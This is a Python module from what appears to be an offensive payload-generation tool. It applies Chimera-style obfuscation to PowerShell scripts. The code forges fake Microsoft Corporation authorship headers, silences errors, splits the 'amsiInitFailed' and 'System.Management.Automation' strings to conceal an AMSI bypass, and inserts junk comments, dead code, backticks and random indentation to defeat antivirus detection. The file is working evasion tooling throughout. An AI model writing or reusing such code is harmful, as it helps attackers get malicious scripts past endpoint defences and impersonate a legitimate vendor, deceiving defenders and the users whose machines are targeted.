"""
PowerShell obfuscation engine – Chimera-style techniques.
Extracted from adaptixpowerShell.py for reuse across generators.
"""

import random
import re
import string
from .utils import random_variable_name, random_string


# ---------------------------------------------------------------------------
# Microsoft-style header
# ---------------------------------------------------------------------------

def generate_microsoft_header() -> str:
    current_year = 2026
    versions = ["1.0.0.0", "2.0.0.0", "2.1.0.0", "3.0.0.0", "5.1.0.0"]
    version = random.choice(versions)
    authors = [
        "Microsoft Corporation",
        "Windows PowerShell Team",
        "Microsoft System Center Team",
        "Microsoft Azure Team",
        "Windows Deployment Services",
    ]
    author = random.choice(authors)
    script_names = [
        "System Configuration Module",
        "Network Diagnostics Utility",
        "Security Policy Manager",
        "Windows Update Assistant",
        "System Health Monitor",
        "Deployment Configuration Tool",
        "Azure Resource Manager",
        "Active Directory Helper",
    ]
    script_name = random.choice(script_names)

    return f"""<#
.SYNOPSIS
    {script_name}

.DESCRIPTION
    This script is part of the Windows Management Framework and provides
    essential system configuration and monitoring capabilities.

    Copyright (c) {current_year} {author}
    All rights reserved.

.PARAMETER ComputerName
    Specifies the target computer for the operation.

.PARAMETER Credential
    Specifies a user account with appropriate permissions.

.EXAMPLE
    PS C:\\> .\\Script.ps1
    Executes the script with default parameters.

.NOTES
    File Name      : {random_variable_name(8)}.ps1
    Author         : {author}
    Prerequisite   : PowerShell V{version}
    Copyright      : (c) {current_year} {author}

.LINK
    https://docs.microsoft.com/powershell
#>

[CmdletBinding()]
param()

Add-Type -AssemblyName System.Management.Automation
Add-Type -AssemblyName System.Core

Set-StrictMode -Version Latest

$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

"""


# ---------------------------------------------------------------------------
# Dead-code / comment generators
# ---------------------------------------------------------------------------

_JUNK_COMMENTS = [
    "Initializing system configuration parameters",
    "Establishing secure connection protocols",
    "Validating user authentication credentials",
    "Processing transaction request",
    "Executing scheduled maintenance routine",
    "Updating database records",
    "Synchronizing network resources",
    "Performing system health check",
    "Loading application dependencies",
    "Configuring service endpoints",
    "Establishing communication channels",
    "Validating input parameters",
    "Processing batch operations",
    "Updating configuration settings",
    "Initializing component libraries",
    "Establishing secure session",
    "Validating security tokens",
    "Processing authentication request",
    "Loading system modules",
    "Configuring network parameters",
]


def create_junk_comment() -> str:
    return "# " + random.choice(_JUNK_COMMENTS) + "."


def generate_dead_code() -> str:
    junk_patterns = [
        lambda: f"${random_variable_name(random.randint(8,15))} = {random.randint(1000,9999)}",
        lambda: f"${random_variable_name(random.randint(8,15))} = '{random_variable_name(random.randint(10,20))}'",
        lambda: f"${random_variable_name(random.randint(8,15))} = $null",
        lambda: f"${random_variable_name(random.randint(8,15))} = @()",
        lambda: f"[Math]::Abs({random.randint(-1000,1000)}) | Out-Null",
        lambda: f"[Math]::Max({random.randint(1,100)}, {random.randint(1,100)}) | Out-Null",
        lambda: f"if ({random.randint(100,200)} -lt {random.randint(1,50)}) {{ return }}",
        lambda: f"'{random_variable_name(10)}'.Length | Out-Null",
        lambda: f"(Get-Date).Ticks | Out-Null",
        lambda: f"Get-Random -Min {random.randint(1,100)} -Max {random.randint(200,500)} | Out-Null",
        lambda: f"# ${random_variable_name(8)} = {random.randint(1,100)}",
        lambda: f"${random_variable_name(6)} = Get-Process | Select-Object -First 1",
    ]
    return random.choice(junk_patterns)()


# ---------------------------------------------------------------------------
# String / variable transformers
# ---------------------------------------------------------------------------

def insert_backticks(text: str, probability: float = 0.75) -> str:
    avoid_chars = set('a0befnrtuxv')
    result = []
    for char in text:
        if char.lower() in avoid_chars:
            result.append(char)
        elif random.random() < probability:
            result.append('`' + char)
        else:
            result.append(char)
    return ''.join(result)


def transformer(text: str, target_strings: list[str], chunk_size: int = 3) -> str:
    variables = []
    replacements: dict[str, str] = {}

    for target in target_strings:
        pattern = re.compile(re.escape(target), re.IGNORECASE)
        if not list(pattern.finditer(text)):
            continue
        chunk_vars = []
        for i in range(0, len(target), chunk_size):
            chunk = target[i:i + chunk_size]
            if chunk:
                var = random_variable_name()
                chunk_vars.append(f"${var}")
                variables.append(f'${var} = "{chunk}"')
        replacement = ('(' + ' + '.join(chunk_vars) + ')') if len(chunk_vars) > 1 else chunk_vars[0]
        replacements[target] = replacement

    var_decls = '\n'.join(variables) + '\n' if variables else ''
    result = text
    for orig, repl in replacements.items():
        result = re.sub(re.escape(orig), repl, result, flags=re.IGNORECASE)
    return var_decls + result


def obfuscate_variable_assignments(text: str, level: int = 3) -> str:
    simple_vars = ['$g', '$c', '$a', '$b', '$ref', '$size', '$ptr', '$f', '$Win32', '$Kernel32']
    for var in simple_vars:
        if var in text:
            new_var = '$' + random_variable_name(random.randint(15, 25))
            text = re.sub(re.escape(var) + r'\b', new_var, text)
    return text


def obfuscate_amsi_bypass(text: str) -> str:
    sma_parts = [random_variable_name(15) for _ in range(5)]
    amsi_parts = [random_variable_name(15) for _ in range(4)]

    header_lines = [
        f'${sma_parts[0]} = "Sys"+"tem.Mana"',
        f'${sma_parts[1]} = "gement.Au"',
        f'${sma_parts[2]} = "tomati"',
        f'${sma_parts[3]} = "on"',
        f'${sma_parts[4]} = ${sma_parts[0]}+${sma_parts[1]}+${sma_parts[2]}+${sma_parts[3]}',
        '',
        f'${amsi_parts[0]} = "amsi"',
        f'${amsi_parts[1]} = "Init"',
        f'${amsi_parts[2]} = "Failed"',
        f'${amsi_parts[3]} = ${amsi_parts[0]}+${amsi_parts[1]}+${amsi_parts[2]}',
        '',
    ]

    result = header_lines[:]
    for line in text.split('\n'):
        if 'System.Management.Automation' in line:
            line = line.replace('System.Management.Automation', f'${sma_parts[4]}')
        if 'amsiInitFailed' in line:
            line = line.replace("'amsiInitFailed'", f'${amsi_parts[3]}')
            line = line.replace('"amsiInitFailed"', f'${amsi_parts[3]}')
        result.append(line)
    return '\n'.join(result)


def insert_comments(text: str, probability: float = 0.3) -> str:
    lines = text.split('\n')
    result = []
    in_here_string = False
    for line in lines:
        stripped = line.strip()
        if '@"' in line or "@'" in line:
            in_here_string = True
        elif stripped in ('"@', "'@"):
            in_here_string = False
            result.append(line)
            continue
        result.append(line)
        if stripped and not stripped.startswith('#') and not in_here_string:
            if random.random() < probability:
                result.append(create_junk_comment())
    return '\n'.join(result)


def randomize_indentation(text: str, max_spaces: int = 4) -> str:
    lines = text.split('\n')
    result = []
    for line in lines:
        stripped = line.strip()
        if stripped:
            if stripped in ('"@', "'@"):
                result.append(stripped)
            else:
                spaces = random.randint(0, max_spaces)
                result.append(' ' * spaces + line.lstrip())
        else:
            result.append(line)
    return '\n'.join(result)


def apply_backticks(text: str, targets: list[str] | None = None) -> str:
    if targets is None:
        targets = ['New-Object', 'Add-Type', 'Invoke-Expression']
    result = text
    for target in targets:
        pattern = re.compile(r'\b' + re.escape(target) + r'\b', re.IGNORECASE)
        for match in reversed(list(pattern.finditer(result))):
            start, end = match.span()
            if start > 0 and result[start - 1] in ('$', '.'):
                continue
            result = result[:start] + insert_backticks(result[start:end]) + result[end:]
    return result


def insert_dead_code(text: str, probability: float = 0.3,
                     min_junk: int = 1, max_junk: int = 3) -> str:
    skip_patterns = [
        'function ', 'try {', 'catch {', '} catch', 'finally {',
        'if (', 'foreach (', 'while (', 'for (',
        '}', 'return', 'break', 'continue',
        '#>', '<#', '.SYNOPSIS', '.DESCRIPTION', '.PARAMETER', '.EXAMPLE', '.NOTES',
        '[CmdletBinding()]', 'param(', 'Add-Type', 'Set-StrictMode',
        '@"', "@'", '"@', "'@",
    ]

    lines = text.split('\n')
    result = []
    in_here_string = False
    here_delim = None

    for line in lines:
        stripped = line.strip()
        if not in_here_string:
            if '@"' in line:
                in_here_string = True
                here_delim = '"@'
            elif "@'" in line:
                in_here_string = True
                here_delim = "'@"
        elif here_delim and stripped == here_delim:
            result.append(line)
            in_here_string = False
            here_delim = None
            continue

        result.append(line)
        if in_here_string or not line.strip():
            continue
        if any(p in line for p in skip_patterns):
            continue
        if random.random() < probability:
            num = random.randint(min_junk, max_junk)
            indent = len(line) - len(line.lstrip())
            for _ in range(num):
                result.append(' ' * indent + generate_dead_code())

    return '\n'.join(result)


# ---------------------------------------------------------------------------
# Master obfuscation function
# ---------------------------------------------------------------------------

def obfuscate_powershell(text: str, level: int = 3) -> str:
    print("[*] Applying PowerShell obfuscation...")
    chunk_sizes = {1: 8, 2: 5, 3: 3, 4: 2, 5: 1}
    _chunk_size = chunk_sizes.get(level, 3)  # noqa: F841  (used by transformer if needed)

    print("  [*] Obfuscating AMSI bypass (Chimera-style)...")
    text = obfuscate_amsi_bypass(text)

    print("  [*] Obfuscating variable names...")
    text = obfuscate_variable_assignments(text, level)

    print("  [*] Inserting comments...")
    text = insert_comments(text, probability=0.2 + level * 0.05)

    print("  [*] Inserting dead code...")
    text = insert_dead_code(text,
                            probability=0.15 + level * 0.05,
                            min_junk=1,
                            max_junk=min(level, 4))

    print("  [*] Applying backticks...")
    text = apply_backticks(text)

    print("  [*] Randomizing indentation...")
    text = randomize_indentation(text, max_spaces=min(level + 1, 5))

    print("[+] Obfuscation complete!")
    return text
